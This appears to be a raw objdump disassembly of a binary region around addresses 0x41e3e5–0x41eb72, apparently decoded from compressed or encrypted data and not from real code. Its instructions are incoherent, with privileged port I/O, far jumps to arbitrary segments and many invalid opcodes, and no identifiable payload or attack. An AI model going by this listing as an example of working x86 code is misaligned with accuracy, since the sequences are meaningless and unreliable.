  41e3e5:	adc    ebp,0x94b8cd2c
  41e3eb:	cmc    
  41e3ec:	fbld   TBYTE PTR [esp+ebp*1-0x56]
  41e3f0:	inc    ebx
  41e3f1:	aad    0x9c
  41e3f3:	sti    
  41e3f4:	add    al,0xae
  41e3f6:	sbb    dl,BYTE PTR [esi-0x30]
  41e3f9:	xchg   edx,eax
  41e3fa:	outs   dx,BYTE PTR ds:[esi]
  41e3fb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41e3fc:	dec    eax
  41e3fd:	jo     0x41e43d
  41e3ff:	mov    es,WORD PTR [ebp-0x15]
  41e402:	paddusb mm6,QWORD PTR [esp+ecx*8-0x56]
  41e407:	jp     0x41e455
  41e409:	fs das 
  41e40b:	mov    eax,ds:0x6ac8a404
  41e410:	push   esp
	...
  41e419:	add    BYTE PTR [eax],al
  41e41b:	int    0x2d
  41e41d:	xchg   ebp,eax
  41e41e:	inc    ebx
  41e41f:	cmc    
  41e420:	sti    
  41e421:	fild   QWORD PTR [edi-0x5bdf5fa9]
  41e427:	ss out 0xf0,al
  41e42a:	mov    dl,0x8d
  41e42c:	mov    eax,ds:0xae0001
  41e431:	add    BYTE PTR [eax],al
  41e433:	imul   BYTE PTR [ebp-0x7f4fed20]
  41e439:	stos   DWORD PTR es:[edi],eax
  41e43a:	xchg   dh,bh
  41e43c:	mov    bh,0x7b
  41e43e:	fsubr  QWORD PTR [ebx-0x3]
  41e441:	imul   DWORD PTR [edi]
  41e443:	(bad)  
  41e444:	idiv   BYTE PTR [edx]
  41e446:	add    ebx,DWORD PTR [ecx]
  41e448:	mov    ebx,DWORD PTR [ebx]
  41e44a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41e44b:	sbb    DWORD PTR [ecx],edx
  41e44d:	jbe    0x41e3ee
  41e44f:	fnstsw WORD PTR [ebp-0x48]
  41e452:	lds    esi,FWORD PTR [ebp+0x5c6de807]
  41e458:	ja     0x41e3fc
  41e45a:	sbb    al,0x0
  41e45c:	stc    
  41e45d:	mov    ds:0xacd3c5cc,al
  41e462:	xchg   ebp,eax
  41e463:	ror    BYTE PTR [edx],cl
  41e465:	pushf  
  41e466:	push   es
  41e467:	cmp    eax,0xf0a7dbf6
  41e46c:	mov    dh,0x77
  41e46e:	adc    al,0xf7
  41e470:	xlat   BYTE PTR ds:[ebx]
  41e471:	jae    0x41e4d7
  41e473:	cwde   
  41e474:	push   edi
  41e475:	out    dx,al
  41e476:	test   eax,0xd307f392
  41e47b:	std    
  41e47c:	test   bl,dl
  41e47e:	sbb    BYTE PTR [ecx+0x6c],ch
  41e481:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41e482:	inc    esi
  41e483:	clc    
  41e484:	and    BYTE PTR [esi+0x4726c713],0xc6
  41e48b:	sub    BYTE PTR [edx+esi*8],0x13
  41e48f:	sbb    eax,0x83daef84
  41e494:	stos   DWORD PTR es:[edi],eax
  41e495:	test   BYTE PTR [eax+0x2816c8fa],dh
  41e49b:	aaa    
  41e49c:	jns    0x41e43f
  41e49e:	aas    
  41e49f:	clc    
  41e4a0:	sub    edi,DWORD PTR [ebx-0x72]
  41e4a3:	aaa    
  41e4a4:	jbe    0x41e429
  41e4a6:	and    dl,bh
  41e4a8:	pop    esp
  41e4a9:	inc    edi
  41e4aa:	xchg   DWORD PTR [esi],eax
  41e4ac:	or     eax,0x47d87fd7
  41e4b1:	xchg   esi,eax
  41e4b2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e4b3:	pop    ss
  41e4b4:	in     al,dx
  41e4b5:	imul   ebx,DWORD PTR [ebp+0x2],0x9
  41e4b9:	push   0x1692d79e
  41e4be:	imul   edx,ebx,0xffffffca
  41e4c1:	add    esi,ecx
  41e4c3:	cwde   
  41e4c4:	sbb    esi,DWORD PTR [edx+ebp*1+0x3d742c8b]
  41e4cb:	jmp    FWORD PTR [eax-0x14fe160b]
  41e4d1:	call   0xa8e72cfb
  41e4d6:	xchg   edx,eax
  41e4d7:	mov    ds:0xdb8ce22c,al
  41e4dc:	and    eax,0x7c8306cf
	...
  41e4e9:	add    BYTE PTR [eax],al
  41e4eb:	adc    esp,DWORD PTR [edi+eiz*8+0xb]
  41e4ef:	test   DWORD PTR [ebx-0xce58301],0x39a04cfc
  41e4f9:	popa   
  41e4fa:	aas    
  41e4fb:	cmp    esp,DWORD PTR [edx+0xae0001]
  41e501:	add    BYTE PTR [eax],al
  41e503:	fnsave [edi-0x6f1993bc]
  41e509:	sub    DWORD PTR [ecx+0x5c2ab99b],ebp
  41e50f:	retf   
  41e510:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41e511:	pop    ebx
  41e512:	inc    eax
  41e513:	popa   
  41e514:	call   0xaf25e963
  41e519:	adc    al,0xc6
  41e51b:	xchg   esp,eax
  41e51c:	pop    ss
  41e51d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41e51e:	mov    DWORD PTR [esi+esi*8],0x376795d6
  41e525:	cdq    
  41e526:	aad    0xce
  41e528:	adc    DWORD PTR [ebp+0x5c],edi
  41e52b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41e52c:	mov    WORD PTR [edi-0x29d4d733],es
  41e532:	xchg   ebx,eax
  41e533:	add    eax,0xf8954c0b
  41e538:	jecxz  0x41e590
  41e53a:	mov    cl,BYTE PTR [esi]
  41e53c:	ja     0x41e58b
  41e53e:	cs and al,ah
  41e541:	sbb    dl,BYTE PTR [edx+0x6f]
  41e544:	or     DWORD PTR [edi+0x2f9000e9],esi
  41e54a:	dec    ecx
  41e54b:	mov    ah,0x81
  41e54d:	cmp    eax,esi
  41e54f:	imul   edi,DWORD PTR [ecx],0x85407447
  41e555:	std    
  41e556:	stc    
  41e557:	jno    0x41e5ba
  41e559:	in     eax,dx
  41e55a:	shl    DWORD PTR [esi],cl
  41e55c:	xchg   ebp,eax
  41e55d:	in     eax,0xfb
  41e55f:	or     eax,0xbe446f1f
  41e564:	gs sbb al,0x39
  41e567:	in     eax,0x10
  41e569:	arpl   WORD PTR [edi+ebp*8-0x62fadf80],si
  41e570:	shr    DWORD PTR [edi-0x7c1afecf],1
  41e576:	ins    BYTE PTR es:[edi],dx
  41e577:	jne    0x41e5b1
  41e579:	aas    
  41e57a:	ret    0xece7
  41e57d:	push   0xffffffce
  41e57f:	repnz stos BYTE PTR es:[edi],al
  41e581:	popa   
  41e582:	push   esi
  41e583:	out    dx,al
  41e584:	jmp    0xf145d733
  41e589:	push   edi
  41e58a:	adc    DWORD PTR [edi],esp
  41e58c:	mov    ch,0xb2
  41e58e:	add    al,BYTE PTR [ecx+0x48]
  41e591:	adc    eax,0xfe3f85ff
  41e596:	repnz dec esp
  41e598:	call   0x77b5ce5
  41e59d:	aad    0xd8
  41e59f:	cmp    esi,eax
  41e5a1:	adc    BYTE PTR [eax+0x136e0e8a],dh
  41e5a7:	inc    edi
  41e5a8:	imul   ebx,DWORD PTR [ebx+0x58],0xb
  41e5ac:	jb     0x41e552
  41e5ae:	and    BYTE PTR [esi],0xa5
	...
  41e5b9:	add    BYTE PTR [eax],al
  41e5bb:	daa    
  41e5bc:	push   ecx
  41e5bd:	imul   esi,DWORD PTR [ecx-0x28004681],0x8274b3d8
  41e5c7:	dec    ebx
  41e5c8:	fcomp  QWORD PTR [ecx]
  41e5ca:	aas    
  41e5cb:	jmp    0xae41e772
  41e5d0:	add    BYTE PTR [eax],al
  41e5d2:	add    BYTE PTR [ebx+0x67],dl
  41e5d5:	aas    
  41e5d6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41e5d7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41e5d8:	and    bh,BYTE PTR [ecx-0x77]
  41e5db:	add    eax,edi
  41e5dd:	and    DWORD PTR [edi+0x7e53d19f],edi
  41e5e3:	xchg   ebp,eax
  41e5e4:	mov    cl,0xcc
  41e5e6:	xor    BYTE PTR [edi+0x3ce024aa],bh
  41e5ec:	mov    ah,0x32
  41e5ee:	paddsw mm6,QWORD PTR [eax-0x47]
  41e5f2:	sbb    cl,BYTE PTR [edx+ecx*4-0x37]
  41e5f6:	jno    0x41e59b
  41e5f8:	outs   dx,BYTE PTR ds:[esi]
  41e5f9:	xor    eax,DWORD PTR [esp+ebx*4]
  41e5fc:	(bad)  
  41e5fd:	adc    esp,DWORD PTR [eax-0x41]
  41e600:	add    bh,al
  41e602:	mov    eax,0xf219eac2
  41e607:	popf   
  41e608:	lods   al,BYTE PTR ds:[esi]
  41e609:	mov    ebp,0x75a09aa2
  41e60e:	dec    edi
  41e60f:	stos   BYTE PTR es:[edi],al
  41e610:	mov    ch,0x53
  41e612:	call   0x6403a53f
  41e617:	fsub   st,st(0)
  41e619:	aas    
  41e61a:	(bad)  
  41e61b:	nop
  41e61c:	cs inc esi
  41e61e:	inc    edx
  41e61f:	adc    DWORD PTR [ebx+0x5ea3ff14],ebp
  41e625:	out    dx,al
  41e626:	sti    
  41e627:	data16 aam 0x8a
  41e62a:	pushf  
  41e62b:	add    al,0x6c
  41e62d:	les    ecx,FWORD PTR [ebx]
  41e62f:	inc    eax
  41e630:	or     BYTE PTR [esi+0x3f35c81e],bl
  41e636:	es into 
  41e638:	popf   
  41e639:	mov    bl,0xb4
  41e63b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41e63c:	add    edx,DWORD PTR [eax]
  41e63e:	sbb    DWORD PTR [esi+0x5d577cf1],esp
  41e644:	js     0x41e619
  41e646:	jmp    0x6c7cae39
  41e64b:	loope  0x41e679
  41e64d:	jl     0x41e600
  41e64f:	lock popa 
  41e651:	loopne 0x41e69b
  41e653:	lock (bad) 
  41e655:	sbb    esp,eax
  41e657:	jge    0x41e610
  41e659:	mov    bh,0x25
  41e65b:	xchg   esi,eax
  41e65c:	sub    al,0x12
  41e65e:	adc    edx,esi
  41e660:	fcomp  DWORD PTR [ecx+0x40]
  41e663:	shl    ah,0x98
  41e666:	in     eax,0x1a
  41e668:	inc    esi
  41e669:	ret    0x3d96
  41e66c:	aad    0xfd
  41e66e:	adc    ch,ch
  41e670:	and    eax,DWORD PTR [ecx-0x4da67e25]
  41e676:	pop    DWORD PTR [edx]
  41e678:	cmc    
  41e679:	fdivr  st,st(7)
  41e67b:	push   ecx
  41e67c:	aam    0x93
  41e67e:	lahf   
  41e67f:	add    BYTE PTR [edx+0x0],0x0
  41e686:	add    BYTE PTR [eax],al
  41e688:	add    BYTE PTR [eax],al
  41e68a:	add    BYTE PTR [esi],dh
  41e68c:	add    dl,BYTE PTR [ebp+0xc]
  41e68f:	jne    0x41e6f0
  41e691:	jg     0x41e6cd
  41e693:	clc    
  41e694:	cs aas 
  41e696:	push   0xdf6b5653
  41e69b:	jno    0x41e627
  41e69d:	add    DWORD PTR [eax],eax
  41e69f:	scas   al,BYTE PTR es:[edi]
  41e6a0:	add    BYTE PTR [eax],al
  41e6a2:	add    BYTE PTR [edx+0x32],bl
  41e6a5:	outs   dx,DWORD PTR ds:[esi]
  41e6a6:	dec    edi
  41e6a7:	mov    eax,0xd58df32f
  41e6ac:	addr16 hlt 
  41e6ae:	out    dx,al
  41e6af:	arpl   WORD PTR [eax],bp
  41e6b1:	dec    ebx
  41e6b2:	adc    BYTE PTR [ebx],bl
  41e6b4:	fnstsw WORD PTR [ebx]
  41e6b6:	data16 add cl,cl
  41e6b9:	sub    DWORD PTR [ebx+0x66f4ecbd],edx
  41e6bf:	and    ecx,DWORD PTR [edx+0x0]
  41e6c2:	dec    edx
  41e6c3:	les    ebp,FWORD PTR [esi]
  41e6c5:	jb     0x41e6e7
  41e6c7:	push   eax
  41e6c8:	ficom  DWORD PTR [ebp+0x34d33d83]
  41e6ce:	xchg   ebp,eax
  41e6cf:	or     ch,dl
  41e6d1:	rol    DWORD PTR [ebx+0x166157d5],1
  41e6d7:	sbb    al,0x1f
  41e6d9:	mov    dh,0xa4
  41e6db:	inc    esp
  41e6dc:	stos   BYTE PTR es:[edi],al
  41e6dd:	dec    ecx
  41e6de:	xor    BYTE PTR [esi+0x2c510703],cl
  41e6e4:	pop    DWORD PTR [ebx*4+0x25ada8f2]
  41e6eb:	int3   
  41e6ec:	or     al,0x3b
  41e6ee:	or     DWORD PTR [ebp+0x6e],ebx
  41e6f1:	movzx  ecx,WORD PTR [ebp+0x66]
  41e6f5:	(bad)  
  41e6f6:	(bad)  [esi+0x7f]
  41e6f9:	mov    ebp,0x40686514
  41e6fe:	out    0xa2,eax
  41e700:	pop    edx
  41e701:	std    
  41e702:	fwait
  41e703:	push   cs
  41e704:	lahf   
  41e705:	fld1   
  41e707:	xchg   esp,eax
  41e708:	dec    ebp
  41e709:	loopne 0x41e783
  41e70b:	dec    dl
  41e70d:	dec    edx
  41e70e:	pop    es
  41e70f:	jbe    0x41e6dd
  41e711:	sar    BYTE PTR [ecx-0x7c244652],1
  41e717:	outs   dx,BYTE PTR ds:[esi]
  41e718:	adc    ebp,esi
  41e71a:	xor    al,0x51
  41e71c:	mov    ds:0xff31f2e9,eax
  41e721:	pop    ds
  41e722:	aad    0x4b
  41e724:	jno    0x41e6db
  41e726:	adc    eax,0x913132f3
  41e72b:	sub    BYTE PTR [edx],al
  41e72d:	push   eax
  41e72e:	ja     0x41e6b5
  41e730:	loope  0x41e7a3
  41e732:	cdq    
  41e733:	pop    es
  41e734:	mov    esi,DWORD PTR [esi+0x44ffc1ea]
  41e73a:	jns    0x41e735
  41e73c:	pop    ebp
  41e73d:	jne    0x41e6d3
  41e73f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41e740:	gs stc 
  41e742:	mov    ecx,esp
  41e744:	pop    esp
  41e745:	push   ecx
  41e746:	lods   al,BYTE PTR ds:[esi]
  41e747:	mov    ecx,esp
  41e749:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41e74a:	push   ss
  41e74b:	loopne 0x41e7a2
  41e74d:	test   DWORD PTR ds:0xaf6e,edx
	...
  41e75b:	or     BYTE PTR [ecx-0x404c48e],dh
  41e761:	dec    ecx
  41e762:	mov    bl,0x94
  41e764:	je     0x41e73d
  41e766:	call   0x8b1f:0xf6c7898a
  41e76d:	add    DWORD PTR [eax],eax
  41e76f:	scas   al,BYTE PTR es:[edi]
  41e770:	add    BYTE PTR [eax],al
  41e772:	add    BYTE PTR [ebp-0x51],ah
  41e775:	xor    bh,bh
  41e777:	retf   
  41e778:	mov    al,0x9c
  41e77a:	push   esp
  41e77b:	xchg   esp,eax
  41e77c:	sbb    eax,0xfdd99b56
  41e781:	adc    al,0xdc
  41e783:	inc    esp
  41e784:	and    cl,BYTE PTR [ebp+0x4b]
  41e787:	sti    
  41e788:	out    dx,eax
  41e789:	pop    es
  41e78a:	pop    ebp
  41e78b:	add    eax,0xc703c941
  41e790:	cmp    esi,DWORD PTR [esi]
  41e792:	(bad)  
  41e793:	out    0xc0,eax
  41e795:	fbld   TBYTE PTR [ecx+0x3a]
  41e798:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e799:	xor    eax,0x73f51384
  41e79e:	pop    es
  41e79f:	mov    ds:0xcc74e627,al
  41e7a4:	cmp    al,0x3a
  41e7a6:	xor    BYTE PTR [edx-0x13],ch
  41e7a9:	add    BYTE PTR [eax+0x1e52fd33],ch
  41e7af:	imul   BYTE PTR [edi-0x3244b2f6]
  41e7b5:	or     eax,0x387e80c0
  41e7ba:	dec    ebx
  41e7bb:	fcomp  QWORD PTR [bx+di]
  41e7be:	add    BYTE PTR [edi+0x5b],ah
  41e7c1:	ds mov esp,0xc5aed293
  41e7c7:	(bad)  
  41e7c8:	and    dh,BYTE PTR [edx]
  41e7ca:	fs jmp ecx
  41e7cd:	and    al,BYTE PTR [ebx]
  41e7cf:	and    dl,BYTE PTR es:[edx]
  41e7d2:	adc    eax,0x9ad14bca
  41e7d7:	inc    esp
  41e7d8:	imul   esp,DWORD PTR [edi],0xffffffdc
  41e7db:	xlat   BYTE PTR ds:[ebx]
  41e7dc:	xchg   edx,eax
  41e7dd:	cmp    BYTE PTR [edi-0x70],al
  41e7e0:	mov    esp,0x4e5a746f
  41e7e5:	cli    
  41e7e6:	rcr    BYTE PTR [eax],cl
  41e7e8:	and    edi,DWORD PTR [esi+0x3c]
  41e7eb:	sub    al,0xba
  41e7ed:	mov    edx,0xd0176d82
  41e7f2:	jmp    0xbdb3:0x3384b4db
  41e7f9:	inc    ebx
  41e7fa:	aad    0xe1
  41e7fc:	stc    
  41e7fd:	cmp    edx,DWORD PTR [edx]
  41e7ff:	nop
  41e800:	and    DWORD PTR [edi],0xa14e1aad
  41e806:	stos   BYTE PTR es:[edi],al
  41e807:	imul   eax,ebx,0xaad008d7
  41e80d:	aaa    
  41e80e:	arpl   WORD PTR [eax+0x74],ax
  41e811:	jae    0x41e863
  41e813:	fs pop eax
  41e815:	aad    0x30
  41e817:	push   edi
  41e818:	es push edi
  41e81a:	mov    cl,cl
  41e81c:	adc    ch,BYTE PTR [esi+0xcc8be2]
	...
  41e82a:	add    bh,bl
  41e82c:	push   ebx
  41e82d:	mov    dl,0x4f
  41e82f:	mov    esi,0x67d3ffef
  41e834:	xchg   ecx,edi
  41e836:	adc    al,0x19
  41e838:	sub    eax,0x8bcd2bcd
  41e83d:	add    DWORD PTR [eax],eax
  41e83f:	scas   al,BYTE PTR es:[edi]
  41e840:	add    BYTE PTR [eax],al
  41e842:	add    BYTE PTR [ebx+0x1b5d6a07],bl
  41e848:	ds (bad) 
  41e84b:	dec    ecx
  41e84c:	rcl    ah,cl
  41e84e:	sbb    eax,0xe503bc05
  41e853:	xchg   esi,eax
  41e854:	cld    
  41e855:	clc    
  41e856:	cmc    
  41e857:	ss ret 
  41e859:	jne    0x41e880
  41e85b:	aad    0xe3
  41e85d:	jb     0x41e8d3
  41e85f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41e860:	push   0xffffffbc
  41e862:	push   edi
  41e863:	adc    DWORD PTR [ebp-0x7d],0xffffff8f
  41e867:	pop    ss
  41e868:	fwait
  41e869:	ror    BYTE PTR [edx+0x5378ff21],cl
  41e86f:	dec    esp
  41e870:	setno  BYTE PTR ss:[esi+0xaba8389]
  41e878:	push   0x69
  41e87a:	ja     0x41e8bd
  41e87c:	mov    al,0x1e
  41e87e:	out    0x90,al
  41e880:	int    0x59
  41e882:	mov    dh,0x6f
  41e884:	loopne 0x41e835
  41e886:	pop    ss
  41e887:	inc    esi
  41e888:	mov    ah,BYTE PTR [ebx+0x256ef2f9]
  41e88e:	pop    ebp
  41e88f:	jbe    0x41e8b1
  41e891:	add    eax,0xee68405b
  41e896:	clc    
  41e897:	out    dx,al
  41e898:	dec    ebx
  41e899:	adc    eax,0xe1ec12fc
  41e89e:	sahf   
  41e89f:	out    0x1f,al
  41e8a1:	push   edx
  41e8a2:	pop    esp
  41e8a3:	lahf   
  41e8a4:	add    DWORD PTR [ebx],esi
  41e8a6:	dec    edx
  41e8a7:	sub    eax,0xb0f36968
  41e8ac:	std    
  41e8ad:	paddsb mm0,QWORD PTR [esi-0x590f27c1]
  41e8b4:	dec    ebp
  41e8b5:	fs aad 0x8b
  41e8b8:	jp     0x41e90f
  41e8ba:	inc    esp
  41e8bb:	pop    ss
  41e8bc:	xor    al,0xf2
  41e8be:	pop    ss
  41e8bf:	shl    BYTE PTR [esi],cl
  41e8c1:	fidiv  WORD PTR [ecx+0x5ef7cd74]
  41e8c7:	mov    al,0xcd
  41e8c9:	cdq    
  41e8ca:	dec    esi
  41e8cb:	scas   al,BYTE PTR es:[edi]
  41e8cc:	xchg   esi,eax
  41e8cd:	pop    edx
  41e8ce:	adc    al,0x29
  41e8d0:	jle    0x41e923
  41e8d2:	jmp    0x5be7:0xaa80cc84
  41e8d9:	mov    al,ds:0x967b6f81
  41e8de:	xchg   esp,eax
  41e8df:	sbb    BYTE PTR [ecx-0x21489d3a],cl
  41e8e5:	sub    ebp,edx
  41e8e7:	dec    ecx
  41e8e8:	pusha  
  41e8e9:	nop
  41e8ea:	xor    BYTE PTR [ecx+0x6690e5bf],dl
  41e8f0:	ins    BYTE PTR es:[edi],dx
	...
  41e8f9:	add    BYTE PTR [eax],al
  41e8fb:	xchg   DWORD PTR [ebx+edx*8],ecx
  41e8fe:	fcmovu st,st(3)
  41e900:	fisttp WORD PTR [edi+0x640ccb5d]
  41e906:	push   ss
  41e907:	dec    ebp
  41e908:	push   ebx
  41e909:	(bad)
  41e90c:	mov    WORD PTR [ecx],es
  41e90e:	add    BYTE PTR [esi+0x33000000],ch
  41e914:	sub    esp,eax
  41e916:	aas    
  41e917:	into   
  41e918:	inc    ecx
  41e919:	int    0xc7
  41e91b:	gs retf 0x1117
  41e91f:	popf   
  41e920:	mov    BYTE PTR [ebp+0x0],dl
  41e923:	int3   
  41e924:	mov    eax,0x64767ef3
  41e929:	sti    
  41e92a:	mov    ds:0xa14ee818,eax
  41e930:	cmc    
  41e931:	fsub   QWORD PTR [esi]
  41e933:	and    al,0xd3
  41e935:	xchg   esp,eax
  41e936:	ret    0x6ad3
  41e939:	lods   al,BYTE PTR ds:[esi]
  41e93a:	out    dx,eax
  41e93b:	fnstsw WORD PTR [esp+ebx*4+0x7aa5032c]
  41e942:	inc    ebx
  41e943:	pop    ebp
  41e944:	addr16 jno 0x41e8ff
  41e947:	cs std 
  41e949:	test   BYTE PTR [esi],bl
  41e94b:	cmc    
  41e94c:	jle    0x41e9a4
  41e94e:	je     0x41e9aa
  41e950:	in     al,dx
  41e951:	aad    0x85
  41e953:	popf   
  41e954:	out    0xd5,al
  41e956:	mov    ds:0x5be192c1,al
  41e95b:	cmc    
  41e95c:	add    BYTE PTR [ecx],dl
  41e95e:	(bad)  
  41e95f:	loopne 0x41e959
  41e961:	loope  0x41e8e7
  41e963:	mov    ds:0x4db45cc2,al
  41e968:	jl     0x41e9e1
  41e96a:	daa    
  41e96b:	daa    
  41e96c:	ret    0x68b8
  41e96f:	mov    ebx,0xdb8fb874
  41e974:	out    0x80,eax
  41e976:	cmc    
  41e977:	xor    al,0x86
  41e979:	xchg   BYTE PTR [edx],dh
  41e97b:	jne    0x41e932
  41e97d:	pop    edx
  41e97e:	mov    al,0x16
  41e980:	xchg   ebx,eax
  41e981:	jnp    0x41e9a8
  41e983:	hlt    
  41e984:	fnstsw WORD PTR [edx+0x208cc9d2]
  41e98a:	rcl    ch,cl
  41e98c:	test   DWORD PTR [edi],0x2d8c5bd5
  41e992:	push   ebp
  41e993:	mov    eax,ds:0x76b9ba69
  41e998:	call   0x6013:0x709f76b8
  41e99f:	and    al,0x38
  41e9a1:	lods   eax,DWORD PTR ds:[esi]
  41e9a2:	sub    eax,0xfa56715c
  41e9a7:	mov    ch,0x6c
  41e9a9:	and    al,0xb4
  41e9ab:	jle    0x41e934
  41e9ad:	or     cl,dh
  41e9af:	arpl   bx,si
  41e9b1:	inc    eax
  41e9b2:	mov    es,WORD PTR [edx+0x4f]
  41e9b5:	in     al,0x7f
  41e9b7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e9b8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e9b9:	pop    esi
  41e9ba:	loopne 0x41ea17
  41e9bc:	call   DWORD PTR ds:0x882458
	...
  41e9ca:	add    BYTE PTR [edi-0x28db29d],bl
  41e9d0:	jle    0x41e991
  41e9d2:	out    dx,eax
  41e9d3:	sbb    edi,esp
  41e9d5:	mov    BYTE PTR [edi+edi*4+0x2944c2a3],dh
  41e9dc:	lea    eax,[ecx]
  41e9de:	add    BYTE PTR [esi+0x19000000],ch
  41e9e4:	sar    DWORD PTR [esi],1
  41e9e6:	mov    eax,ebp
  41e9e8:	pop    es
  41e9e9:	dec    edi
  41e9ea:	jo     0x41e9eb
  41e9ec:	in     eax,dx
  41e9ed:	push   ss
  41e9ee:	jle    0x41e9f9
  41e9f0:	call   0xbc650fe2
  41e9f5:	cwde   
  41e9f6:	pusha  
  41e9f7:	daa    
  41e9f8:	cli    
  41e9f9:	ds push es
  41e9fb:	mov    bh,0x58
  41e9fd:	dec    ebx
  41e9fe:	mov    eax,ds:0xc47760d6
  41ea03:	mov    esp,0x80b65a66
  41ea08:	test   eax,0x88ffabe1
  41ea0d:	mov    ebp,0x9464410b
  41ea12:	loop   0x41ea3f
  41ea14:	int3   
  41ea15:	or     eax,0xc9f28aeb
  41ea1a:	sub    eax,0xe6a45577
  41ea1f:	push   eax
  41ea20:	xor    DWORD PTR [ecx+0x3d],edx
  41ea23:	push   ecx
  41ea24:	aam    0x59
  41ea26:	or     DWORD PTR [edi+edx*4],ebp
  41ea29:	push   0xfeae20bb
  41ea2e:	ins    DWORD PTR es:[edi],dx
  41ea2f:	mov    ebp,0x6a13b06c
  41ea34:	ja     0x41e9f1
  41ea36:	int    0x90
  41ea38:	je     0x41ea73
  41ea3a:	inc    ebp
  41ea3b:	jae    0x41ea79
  41ea3d:	fnstsw WORD PTR [edi+0x22c09a25]
  41ea43:	pop    esi
  41ea44:	cmp    BYTE PTR [ebx+0x6b],ah
  41ea47:	push   ebp
  41ea48:	bound  ebp,QWORD PTR [ecx+0x63]
  41ea4b:	sbb    eax,0x2874d9b5
  41ea50:	ss jns 0x41ea65
  41ea53:	mov    edi,DWORD PTR [ecx+0x75]
  41ea56:	cli    
  41ea57:	sub    al,0x7d
  41ea59:	test   BYTE PTR [eax],ah
  41ea5b:	dec    esp
  41ea5c:	fcomp  QWORD PTR [eax+0x27583ad8]
  41ea62:	adc    al,0x48
  41ea64:	jae    0x41eac7
  41ea66:	inc    ebp
  41ea67:	xchg   DWORD PTR [eax],esp
  41ea69:	loope  0x41eade
  41ea6b:	mov    al,0xbe
  41ea6d:	std    
  41ea6e:	iret   
  41ea6f:	xor    dl,dh
  41ea71:	popa   
  41ea72:	jb     0x41ea43
  41ea74:	(bad)
  41ea79:	scas   al,BYTE PTR es:[edi]
  41ea7a:	js     0x41ea2d
  41ea7c:	cmp    BYTE PTR [ecx-0x31],ch
  41ea7f:	rcl    DWORD PTR [esi+0xe],cl
  41ea82:	stos   DWORD PTR es:[edi],eax
  41ea83:	loope  0x41ea0f
  41ea85:	dec    edi
  41ea86:	cmp    ebp,DWORD PTR [edx-0x70]
  41ea89:	xor    BYTE PTR [eax+0x1d2d49fd],bl
  41ea8f:	hlt    
  41ea90:	add    BYTE PTR [eax],0x0
	...
  41ea9b:	jo     0x41eac0
  41ea9d:	and    eax,0x7c6f7769
  41eaa2:	cmp    esp,DWORD PTR [eax-0x744311e4]
  41eaa8:	push   ds
  41eaa9:	shl    cl,cl
  41eaab:	xlat   BYTE PTR ds:[ebx]
  41eaac:	lea    eax,[ecx]
  41eaae:	add    BYTE PTR [esi-0x56000000],ch
  41eab4:	or     BYTE PTR [eax+0x46be6c04],0xf4
  41eabb:	xor    edx,DWORD PTR [eax-0x6]
  41eabe:	aaa    
  41eabf:	loop   0x41eb15
  41eac1:	dec    ecx
  41eac2:	mov    ds:0xc3915e6,eax
  41eac7:	das    
  41eac8:	dec    esp
  41eac9:	sbb    al,BYTE PTR [ecx+0x5f79c3ca]
  41eacf:	hlt    
  41ead0:	adc    ebx,edx
  41ead2:	push   edx
  41ead3:	adc    DWORD PTR [eax+0x67],eax
  41ead6:	dec    ecx
  41ead7:	sub    BYTE PTR [esp+ecx*8+0x76],dl
  41eadb:	das    
  41eadc:	test   al,0x17
  41eade:	push   ds
  41eadf:	repz xor BYTE PTR [edx],bh
  41eae2:	push   0x46
  41eae4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41eae5:	arpl   WORD PTR [eax+0x6df1982d],dx
  41eaeb:	retf   0x1b54
  41eaee:	push   ss
  41eaef:	or     eax,0xa2938b0a
  41eaf4:	mov    es,WORD PTR [eax+0x15]
  41eaf7:	and    BYTE PTR [ebp-0x47],bh
  41eafa:	fiadd  WORD PTR [esi+ebp*8+0x2b295a33]
  41eb01:	add    DWORD PTR [edi],eax
  41eb03:	nop
  41eb04:	sbb    eax,0x2f13315c
  41eb09:	pop    esp
  41eb0a:	leave  
  41eb0b:	mov    dh,0xa2
  41eb0d:	pop    es
  41eb0e:	push   es
  41eb0f:	cli    
  41eb10:	and    BYTE PTR [esi+0x1f],0x7e
  41eb14:	stos   DWORD PTR es:[edi],eax
  41eb15:	dec    edx
  41eb16:	mov    ds:0x502c1b39,al
  41eb1b:	add    eax,0xe46ffa15
  41eb20:	(bad)  
  41eb21:	sbb    edi,ebx
  41eb23:	sti    
  41eb24:	mov    dh,0x27
  41eb26:	fadd   QWORD PTR [ebp+0x17]
  41eb29:	xchg   DWORD PTR [ecx-0x4c791b64],esi
  41eb2f:	sbb    al,0x93
  41eb31:	(bad)  
  41eb32:	(bad)  
  41eb33:	pop    ebx
  41eb34:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41eb35:	add    al,0x36
  41eb37:	xchg   ebp,eax
  41eb38:	cld    
  41eb39:	add    eax,0x58dc73b2
  41eb3e:	aam    0x11
  41eb40:	or     ch,BYTE PTR [esi]
  41eb42:	xor    ecx,ebx
  41eb44:	mov    ds:0xed2d7d7b,eax
  41eb49:	dec    ebp
  41eb4a:	sbb    BYTE PTR [esi-0x80],0xec
  41eb4e:	or     BYTE PTR [esi-0x6dafad50],bh
  41eb54:	icebp  
  41eb55:	and    ah,BYTE PTR [ecx-0x66]
  41eb58:	ds push ecx
  41eb5a:	jmp    0xe7ae:0xe9ba3d68
	...
  41eb69:	add    BYTE PTR [eax],al
  41eb6b:	xchg   esp,eax
  41eb6c:	nop
  41eb6d:	ffree  st(0)
  41eb6f:	(bad)  
  41eb71:	popf   
  41eb72:	aam    0x57
